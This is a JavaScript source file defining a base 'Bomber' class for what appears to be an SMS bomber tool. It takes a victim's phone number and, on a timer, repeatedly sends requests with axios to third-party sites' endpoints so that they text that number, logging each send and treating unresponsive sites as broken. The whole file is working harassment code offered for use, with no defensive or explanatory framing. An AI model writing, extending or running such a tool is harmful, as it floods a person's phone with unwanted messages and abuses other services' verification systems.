const axios = require("axios");
const requestTypes = require("../data-structures/requestTypes");

class Bomber {
    constructor(phone){
        this.phone = phone;
    }
    requestType;
    headers;
    data;
    static country;
    spamInterval;
    siteName;
    url;
    phone;
    delay;
    start(){
        this.sendSms(); 
        this.spamInterval = setInterval(() => {
            this.sendSms();     
        }, this.delay);
    }
    stop(){
        clearInterval(this.spamInterval);
    }
    formUrlEncoded(x){ 
        return Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '');
    }
    sendSms(){
        axios[this.requestType](this.url, this.data, { headers: this.headers })
        .then((response) => {console.log("Send sms from " + this.siteName + ".");})
        .catch((error) => this.handleError(error));
    }
    handleError(err){     
        console.log("Site " + this.siteName + " is not working.");
        //console.log(err.response.data)
    }
    splitPhone(){
        this.phone = this.phone.split("+")[1];
    }
}

module.exports = Bomber;